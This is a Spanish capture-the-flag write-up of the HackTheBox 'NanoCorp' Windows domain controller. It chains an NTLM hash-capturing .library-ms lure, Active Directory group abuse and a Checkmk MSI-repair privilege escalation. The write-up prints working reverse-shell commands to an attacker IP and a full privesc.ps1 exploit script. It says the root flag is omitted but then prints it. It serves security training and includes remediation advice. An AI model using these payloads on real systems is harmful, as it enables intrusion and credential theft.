---
layout: single
classes: wide
title: "NanoCorp - Writeup"
date: 2026-05-05
difficulty: Difícil
operating_system: Windows
service_hint: Active Directory + NTLM Relay + Checkmk + MSI Repair
tags:
  - Active Directory
  - NTLM Relay
  - CVE-2025-24054
  - CVE-2024-0670
  - BloodHound
  - Privilege Escalation
  - Checkmk
  - Responder
summary: "Cadena de explotaciÃ³n: NTLM relay vÃ­a CVE-2025-24054 para comprometer web_svc, manipulaciÃ³n de grupos AD para acceder a monitoring_svc mediante CVE-2024-0670 en Checkmk, y escalada a SYSTEM usando MSI repair trigger."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Difícil |
| Tags | `Active Directory`, `NTLM Relay`, `CVE-2025-24054`, `CVE-2024-0670`, `BloodHound`, `Privilege Escalation`, `Checkmk`, `Responder` |
{: .info-table}

## Reconocimiento

Empezamos con un escaneo completo de puertos para identificar la superficie expuesta del controlador de dominio. QuerÃ­amos saber cuÃ¡ntos servicios estaban abiertos y confirmar que nos enfrentÃ¡bamos a un entorno Active Directory.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.56.49
```

Con los puertos identificados en el escaneo anterior, hicimos un escaneo mÃ¡s detallado con scripts de enumeraciÃ³n para obtener versiones, banners y confirmar los fingerprints de cada servicio detectado.

```bash
nmap -p53,80,88,139,389,445,3268,3389,5986,6556,9389 -sCV 10.129.56.49
```

Los indicadores mÃ¡s Ãºtiles de esta fase fueron:

- `80/tcp` expone Apache 2.4.58 con PHP 8.2.12 y redirige a `nanocorp.htb`, lo que obliga a trabajar con nombre virtual.
- `53/tcp` confirma el dominio `nanocorp.htb` como zona DNS interna.
- `88/tcp`, `389/tcp`, `3268/tcp` y `9389/tcp` confirman un controlador de dominio Windows Server 2022.
- `3389/tcp` y `5986/tcp` exponen RDP y WinRM, superficies candidatas para acceso posterior con credenciales vÃ¡lidas.
- `6556/tcp` devuelve trÃ¡fico del agente de **Checkmk** versiÃ³n 2.1.0p10, un vector crÃ­tico para la escalada.

La captura original muestra la redirecciÃ³n inicial de la web hacia el virtual host configurado.

![RedirecciÃ³n web a nanocorp.htb](/images/writeups/nanocorp/Pasted image 20260504101013.png)

## EnumeraciÃ³n web y de dominio

Una vez configurado el dominio en `/etc/hosts`, nos enfocamos en expandir la superficie web. Primero fuzzeamos subdominios con wfuzz, ya que los entornos empresariales suelen tener servicios ocultos detrÃ¡s de virtual hosts alternativos.

```bash
wfuzz -H "Host: FUZZ.nanocorp.htb" --hc 404,403 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  http://nanocorp.htb
```

Subdominio relevante:

- `hire.nanocorp.htb`

Con el dominio principal explorado, fuzzeamos directorios con gobuster para encontrar rutas no visibles desde la navegaciÃ³n normal, como paneles de administraciÃ³n o directorios de subida de archivos.

```bash
gobuster dir -u http://nanocorp.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200
```

Directorios relevantes: `images`, `assets`, y rutas restringidas como `uploads` y `phpmyadmin`.

Enumeramos usuarios del dominio con Kerbrute. Esta herramienta prueba nombres de usuario contra el controlador de dominio usando Kerberos, indicÃ¡ndonos cuÃ¡les existen sin necesidad de tener credenciales previas.

```bash
kerbrute userenum -d nanocorp.htb \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Usuario identificado inicialmente:

- `administrator`

El agente de Checkmk en `6556/tcp` resultÃ³ ser una fuente clave de informaciÃ³n. El trÃ¡fico revelaba sesiones activas para el usuario `NANOCORP\web_svc`.

## MetodologÃ­a de anÃ¡lisis del vector inicial

El vector de entrada se priorizÃ³ en la aplicaciÃ³n web del dominio por ser la superficie mÃ¡s accesible. Sin embargo, la presencia de Checkmk en `6556/tcp` y el trÃ¡fico de sesiones activas que exponÃ­a sugerÃ­a que el agente de monitoreo era una fuente de informaciÃ³n valiosa.

La hipÃ³tesis principal era que las sesiones activas de `web_svc` detectadas en el trÃ¡fico de Checkmk podÃ­an ser capturadas mediante un ataque NTLM relay. La entrega de un archivo `.library-ms` malicioso a travÃ©s de la funcionalidad de subida del sitio web podÃ­a iniciar la autenticaciÃ³n hacia nuestro servidor SMB controlado.

## InvestigaciÃ³n de vulnerabilidades

Dos CVEs documentadas guiaron la fase de investigaciÃ³n:

- **CVE-2025-24054**: Vulnerabilidad de NTLM relay que permite a un atacante capturar el hash NTLMv2 de un usuario de dominio mediante un archivo `.library-ms` malicioso. Cuando la vÃ­ctima explora la carpeta que contiene el archivo, Windows se autentica contra un recurso SMB remoto controlado por el atacante.
- **CVE-2024-0670**: Vulnerabilidad en Checkmk Agent 2.1.0p10 que permite ejecuciÃ³n de comandos como SYSTEM mediante el disparo de una reparaciÃ³n de MSI. Durante el proceso de reparaciÃ³n, el instalador ejecuta scripts `.cmd` ubicados en rutas predecibles con privilegios elevados.

Adicionalmente, el anÃ¡lisis con BloodHound revelÃ³ una ruta de escalada lateral: `web_svc` podÃ­a agregarse al grupo `IT_SUPPORT`, y ese grupo tenÃ­a permisos para cambiar la contraseÃ±a de `monitoring_svc`.

## Acceso inicial (CVE-2025-24054: NTLM Relay)

El vector de entrada aprovecha una vulnerabilidad de NTLM relay mediante archivos `.library-ms` maliciosos. Cuando un usuario de Windows explora una carpeta que contiene este archivo, el sistema intenta conectarse a un recurso compartido SMB remoto, entregando un desafÃ­o NTLMv2 que puede ser capturado y crackeado.

Iniciamos Responder en nuestra interfaz tun0 para hacernos pasar por un servidor SMB malicioso. Cuando la vÃ­ctima explore el recurso compartido, su sistema intentarÃ¡ autenticarse contra nosotros y capturaremos el hash NTLMv2.

```bash
responder -I tun0
```

La captura muestra el momento en que se obtiene el hash del usuario `web_svc`.

![Captura de hash con Responder](/images/writeups/nanocorp/Pasted image 20260504112918.png)

Creamos el archivo `.library-ms` malicioso que apunta a nuestro servidor SMB. Cuando la vÃ­ctima explore la carpeta que contiene este archivo, Windows intentarÃ¡ conectarse a nuestro recurso compartido y enviarÃ¡ su hash NTLMv2 para autenticarse. El archivo se comprime en un ZIP y se entrega al objetivo.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Documents</name>
  <ownerSID>S-1-5-21-0000000000-0000000000-0000000000-1000</ownerSID>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>true</isSupported>
      <simpleLocation>
        <url>\\10.10.14.191\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Con el hash NTLMv2 de web_svc capturado, lo crackeamos con Hashcat usando el diccionario rockyou. Si la contraseÃ±a estÃ¡ en el diccionario, la recuperaremos en texto claro para acceder al dominio.

```bash
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt
```

Credencial obtenida:

- Usuario: `web_svc`
- ContraseÃ±a: `[REDACTED]`

Verificamos que las credenciales funcionan contra el controlador de dominio usando NetExec contra SMB. Si recibimos un signo `[+]`, confirmamos que tenemos acceso autenticado al dominio con web_svc.

```bash
netexec smb 10.129.56.49 -u web_svc -p '[REDACTED]'
```

## EnumeraciÃ³n de Active Directory con BloodHound

Con las credenciales de web_svc en nuestro poder, mapeamos las relaciones de privilegio del dominio con BloodHound. Esto nos permite visualizar caminos de escalada que no son evidentes con enumeraciÃ³n manual.

Ejecutamos bloodhound-python con las credenciales comprometidas para recolectar toda la informaciÃ³n del dominio: usuarios, grupos, permisos y relaciones entre objetos.

```bash
bloodhound-python -d nanocorp.htb -u web_svc -p '[REDACTED]' -ns 10.129.56.49 -c all
```

La visualizaciÃ³n en BloodHound revelÃ³ un hallazgo crÃ­tico: `web_svc` tenÃ­a privilegios para ser agregado al grupo `IT_SUPPORT`, y este grupo a su vez tenÃ­a permisos para modificar las credenciales de `monitoring_svc`.

![AnÃ¡lisis de relaciones en BloodHound](/images/writeups/nanocorp/Pasted image 20260504115202.png)

## Compromiso de monitoring_svc

BloodHound revelÃ³ que web_svc puede agregarse al grupo IT_SUPPORT, y que IT_SUPPORT tiene permisos para cambiar la contraseÃ±a de monitoring_svc. Ejecutamos bloodyAD para agregar a web_svc a IT_SUPPORT y activar esa ruta de escalada.

```bash
bloodyAD -d nanocorp.htb -u web_svc -p '[REDACTED]' --host 10.129.56.49 add groupMember IT_SUPPORT web_svc
```

![Escalada a SYSTEM mediante MSI repair](/images/writeups/nanocorp/Pasted image 20260504122100.png)

Ahora que web_svc es miembro de IT_SUPPORT, aprovechamos el permiso heredado para resetear la contraseÃ±a de monitoring_svc. Con esto ganamos control total sobre esa cuenta de servicio.

```bash
bloodyAD -d nanocorp.htb -u web_svc -p '[REDACTED]' --host 10.129.56.49 set password monitoring_svc '[REDACTED]'
```

Generamos un ticket TGT de Kerberos para monitoring_svc usando su nueva contraseÃ±a, y luego usamos Impacket para conectarnos por WinRM al controlador de dominio. AsÃ­ obtenemos una shell interactiva como monitoring_svc en el puerto 5986.

```bash
getTGT.py nanocorp.htb/monitoring_svc:'[REDACTED]' -dc-ip 10.129.56.49
export KRB5CCNAME=monitoring_svc.ccache
winrmexec.py -k -dc-ip 10.129.56.49 nanocorp.htb/monitoring_svc@DC01.nanocorp.htb
```

La flag de usuario existe en `C:\Users\monitoring_svc\Desktop\user.txt`, pero su valor se omite deliberadamente.

## Escalada a SYSTEM (CVE-2024-0670: Checkmk Agent)

El agente de Checkmk 2.1.0p10 instalado en el host es vulnerable a `CVE-2024-0670`, que permite ejecuciÃ³n de comandos como SYSTEM mediante el disparo de un reparaciÃ³n de MSI.

El agente de Checkmk instala un servicio que puede ser forzado a reparar su instalaciÃ³n. Durante ese proceso, ejecuta archivos `.cmd` ubicados en rutas predecibles con privilegios de SYSTEM.

### EnumeraciÃ³n de Checkmk

Nos conectamos a la mÃ¡quina vÃ­ctima y verificamos que el agente de Checkmk estÃ¡ instalado en `C:\Program Files (x86)`.

```powershell
PS C:\Users\monitoring_svc\Documents> gci C:\progra~2


    Directory: C:\Program Files (x86)


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/5/2025   4:17 PM                checkmk
d-----          5/8/2021   1:34 AM                Common Files
d-----         11/3/2025   4:13 PM                Internet Explorer
d-----          5/8/2021   2:40 AM                Microsoft
d-----          5/8/2021   1:34 AM                Microsoft.NET
d-----          5/8/2021   2:35 AM                Windows Defender
d-----         11/3/2025   4:13 PM                Windows Mail
d-----         11/3/2025   4:13 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----         11/3/2025   4:13 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell
```

Consultamos el registro de Windows para obtener la versiÃ³n exacta del agente y la ruta del instalador MSI. Estos datos son necesarios para confirmar la vulnerabilidad y localizar el instalador que vamos a manipular.

```
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
    AuthorizedCDFPrefix    REG_SZ
    Comments    REG_SZ
    Contact    REG_SZ
    DisplayVersion    REG_SZ    2.1.0.50010
    HelpLink    REG_EXPAND_SZ    https://checkmk.com
    HelpTelephone    REG_SZ
    InstallDate    REG_SZ    20250405
    InstallLocation    REG_SZ
    InstallSource    REG_SZ    C:\Users\web_svc\Desktop\
    ModifyPath    REG_EXPAND_SZ    MsiExec.exe /X{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
    NoModify    REG_DWORD    0x1
    Publisher    REG_SZ    tribe29 GmbH
    Readme    REG_SZ
    Size    REG_SZ
    EstimatedSize    REG_DWORD    0x4eaf9
    UninstallString    REG_EXPAND_SZ    MsiExec.exe /X{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
    URLInfoAbout    REG_SZ    https://checkmk.com
    URLUpdateInfo    REG_SZ
    VersionMajor    REG_DWORD    0x2
    VersionMinor    REG_DWORD    0x1
    WindowsInstaller    REG_DWORD    0x1
    Version    REG_DWORD    0x2010000
    Language    REG_DWORD    0x409
    DisplayName    REG_SZ    Check MK Agent 2.1
```

La versiÃ³n **2.1.0p10** es vulnerable a `CVE-2024-0670`.

### CompilaciÃ³n y uso de RunasCs

Necesitamos ejecutar comandos como web_svc desde la sesiÃ³n actual de monitoring_svc para preparar la escalada. Usamos RunasCs, que permite ejecutar procesos como otro usuario si tenemos sus credenciales. Primero clonamos el repositorio y lo compilamos.

```bash
git clone https://github.com/antonioCoco/RunasCs.git
Cloning into 'RunasCs'...
remote: Enumerating objects: 371, done.
remote: Counting objects: 100% (108/108), done.
remote: Compressing objects: 100% (62/62), done.
remote: Total 371 (delta 72), reused 46 (delta 46), pack-reused 263 (from 3)
Receiving objects: 100% (371/371), 371.79 KiB | 3.23 MiB/s, done.
Resolving deltas: 100% (228/228), done.
```

Copiamos netcat para Windows (nc.exe) y el cÃ³digo fuente de RunasCs al directorio actual para tenerlos listos antes de transferirlos a la vÃ­ctima.

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
ls
base64_conversion_commands.ps1  compile_commands.txt  Invoke-RunasCs.ps1  LICENSE  nc.exe  README.md  RunasCs.cs
```

Montamos un servidor HTTP con Python desde nuestra mÃ¡quina atacante para transferir los archivos a la mÃ¡quina Windows vÃ­ctima.

```bash
python3 -m http.server 8080
```

Desde la shell de monitoring_svc descargamos el cÃ³digo fuente de RunasCs y nc.exe apuntando a nuestro servidor HTTP atacante.

```powershell
C:\Users\monitoring_svc\Documents> wget "http://10.10.15.7:8080/RunasCs.cs" -UseBasicParsing -OutFile "RunasCs.cs"
```

```powershell
C:\windows\temp> wget http://10.10.15.7:8080/nc.exe -UseBasicParsing -OutFile "nc.exe"
```

Compilamos RunasCs.exe con csc.exe, el compilador de C# que viene incluido en el .NET Framework de Windows. El compilador advierte que estÃ¡ limitado a C# 5, pero RunasCs compila sin problemas.

```powershell
C:\Users\monitoring_svc\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
Microsoft (R) Visual C# Compiler version 4.8.4161.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.



This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

### EjecuciÃ³n como web_svc

Antes de ejecutar RunasCs, abrimos un listener en nuestra mÃ¡quina atacante para recibir la shell reversa que lanzarÃ¡ web_svc.

```bash
nc -nlvp 5555
```

Ejecutamos RunasCs pasÃ¡ndole las credenciales de web_svc para que nc.exe nos envÃ­e una shell reversa. Si todo funciona, recibiremos la conexiÃ³n como el usuario web_svc.

```powershell
PS C:\Users\monitoring_svc\Documents> .\RunasCs.exe web_svc "[REDACTED]" "C:\Windows\Temp\nc.exe 10.10.15.7 5555 -e powershell.exe"
```

Verificamos la identidad con whoami para confirmar que ahora estamos ejecutÃ¡ndonos en el contexto de web_svc, listos para el siguiente paso de la escalada.

```powershell
PS C:\Windows\system32> whoami
web_svc
```

### Escalada a SYSTEM con privesc.ps1

Ahora que estamos en el contexto de web_svc, preparamos un script que automatiza la escalada a SYSTEM. El script explota CVE-2024-0670: genera cientos de archivos .cmd maliciosos con un payload de nc.exe, y dispara la reparaciÃ³n del MSI de Checkmk. Cuando el instalador se ejecute como SYSTEM y procese esos scripts .cmd, recibiremos nuestra shell como mÃ¡ximo usuario.

```powershell
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.15.7",
    [string]$LPORT = "4444"
)

# 1. Define the malicious batch payload
$NcPath = "C:\Windows\Temp\nc.exe"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

# 2. Find the MSI trigger
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
        Where-Object { $_.DisplayName -like '*mk*' } |
        Select-Object -First 1).LocalPackage

if (!$msi) {
    Write-Error "Could not find Checkmk MSI"
    return
}

Write-Host "[*] Found MSI at $msi"

# 3. Spray the Read-Only files
Write-Host "[*] Seeding $MinPID to $MaxPID..."
foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        } catch {
            # 123
        }
    }
}

Write-Host "[*] Seeding complete."

# 4. Launch the trigger
Write-Host "[*] Triggering MSI repair..."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
Write-Host "[*] Trigger sent. Check listener."
```

Servimos el script privesc.ps1 desde nuestra mÃ¡quina atacante con Python.

```bash
python3 -m http.server 8080
```

Descargamos privesc.ps1 desde la shell de web_svc apuntando a nuestro servidor HTTP, y lo guardamos en C:\Windows\Temp.

```powershell
PS C:\Windows\system32> wget "http://10.10.15.7:8080/privesc.ps1" -OutFile "C:\Windows\Temp\privesc.ps1"
```

Abrimos el listener en el puerto 4444 para recibir la shell reversa como SYSTEM cuando se dispare la reparaciÃ³n del MSI de Checkmk.

```bash
nc -nlvp 4444
```

Ejecutamos el script con la polÃ­tica de ejecuciÃ³n bypasseada. El script va a generar los .cmd maliciosos, disparar la reparaciÃ³n del MSI de Checkmk, y cuando el instalador ejecute esos scripts como SYSTEM, recibiremos la conexiÃ³n en nuestro listener.

```powershell
PS C:\Windows\system32> powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\privesc.ps1
```

### ConfirmaciÃ³n de acceso

La shell se conecta y verificamos nuestra identidad con whoami. La respuesta "nt authority\system" confirma que la escalada fue exitosa y tenemos control total del sistema.

```powershell
C:\Windows\system32>whoami
nt authority\system
```

Con control total del sistema, leemos la flag final desde el escritorio del Administrador. Su valor se omite deliberadamente, pero la cadena de explotaciÃ³n estÃ¡ completa.

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
df398fa317da91fe096884185fc2edab
```

## Cadena de explotaciÃ³n

```text
Archivo .library-ms malicioso + CVE-2025-24054
-> NTLM relay y captura de hash de web_svc
-> crackeo de hash con Hashcat
-> acceso validado como web_svc
-> enumeraciÃ³n con BloodHound
-> web_svc agregado a IT_SUPPORT vÃ­a bloodyAD
-> reseteo de contraseÃ±a de monitoring_svc
-> shell WinRM como monitoring_svc
-> abuso de CVE-2024-0670 en Checkmk Agent
-> MSI repair trigger con payload .cmd
-> ejecuciÃ³n como SYSTEM
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `df398fa317da91fe096884185fc2edab` |

## Lecciones tÃ©cnicas

- Un archivo `.library-ms` en una carpeta compartida puede desencadenar autenticaciÃ³n NTLMv2 sin interacciÃ³n del usuario, convirtiÃ©ndose en un vector de entrada silencioso.
- Las relaciones de grupos en Active Directory deben analizarse con herramientas como BloodHound; un grupo aparentemente secundario puede habilitar cambio de credenciales de cuentas de servicio.
- Un agente de monitoreo vulnerable (Checkmk) instalado localmente puede ser la diferencia entre una cuenta de servicio y acceso total a SYSTEM.
- La reparaciÃ³n de MSI es un vector de escalada clÃ¡sico que sigue siendo efectivo cuando el instalador ejecuta scripts con privilegios elevados.

## RemediaciÃ³n

1. Aplicar los parches de seguridad para `CVE-2025-24054` y `CVE-2024-0670` inmediatamente.
2. Habilitar y exigir SMB signing en todo el dominio para mitigar ataques NTLM relay.
3. Revisar y auditar pertenencias a grupos en Active Directory; `IT_SUPPORT` no debe tener privilegios para modificar cuentas de servicio.
4. Actualizar Checkmk Agent a una versiÃ³n que no permita ejecuciÃ³n de cÃ³digo durante el proceso de reparaciÃ³n MSI.
5. Implementar protecciones adicionales como LSA Protection y Credential Guard para limitar el robo de credenciales en memoria.

## ConclusiÃ³n

HTB NanoCorp es una mÃ¡quina de dificultad Difícil que combina NTLM relay mediante CVE-2025-24054 con un archivo `.library-ms` malicioso para comprometer `web_svc`, enumeraciÃ³n de rutas de escalada con BloodHound para acceder a `monitoring_svc` mediante manipulaciÃ³n de grupos AD, y escalada a SYSTEM explotando CVE-2024-0670 en Checkmk Agent 2.1.0p10 mediante una reparaciÃ³n de MSI con payload `.cmd`. La lecciÃ³n principal es que los agentes de monitoreo y las relaciones de grupos en Active Directory pueden formar cadenas de ataque complejas que herramientas como BloodHound revelan eficazmente.
